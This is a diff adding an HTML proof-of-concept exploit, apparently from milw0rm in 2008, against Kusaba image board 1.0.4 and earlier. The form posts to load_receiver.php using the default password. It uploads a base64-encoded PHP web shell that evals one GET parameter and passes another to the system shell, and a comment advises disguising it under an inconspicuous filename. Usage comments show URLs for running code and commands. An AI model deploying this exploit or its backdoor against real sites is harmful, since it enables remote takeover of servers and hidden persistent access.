@@ -1,0 +1,28 @@
+<!--
+9 Oct 2008
+Kusaba <= 1.0.4 Remote Code Execution Exploit #2
+Sausage <tehsausage@gmail.com>
+
+Will work if they have left the load_receiver.php script un-edited.
+
+After execution: (Yes these are the exact URLs)
+http://www.kusaba.image.board/url/change this to the same value as your
+KU_ROOTDIRpost.php?pc=print "Hello";
+http://www.kusaba.image.board/url/change this to the same value as your
+KU_ROOTDIRpost.php?sc=echo Hello
+-->
+<pre>
+<form action="./load_receiver.php" method="POST">
+<input type="text" name="password" value="changeme"> <!-- Don't actually
+change this, unless they have changed their password and you know it -->
+<input type="text" name="type" value="direct">
+<input type="text" name="file"
+value="PD9waHAgaXNzZXQoJF9HRVRbJ3BjJ10pPyhldmFsKHVybGRlY29kZShzdHJpcHNsYXNoZXMoJF9HRVRbJ3BjJ10pKSkpOihpc3NldCgkX0dFVFsnc2MnXSk/KHBhc3N0aHJ1KHVybGRlY29kZShzdHJpcHNsYXNoZXMoJF9HRVRbJ3NjJ10pKSkpOihoZWFkZXIoJ0xvY2F0aW9uOiAuLi8nKSkpOw==">
+<!-- same backdoor from the paint_save.php exploit -->
+<input type="text" name="targetname" value="post.php"> <!-- Any
+inconspicuous filename will do -->
+
+<input type="submit" value="Exploit">
+</form>
+
+# milw0rm.com [2008-10-09]
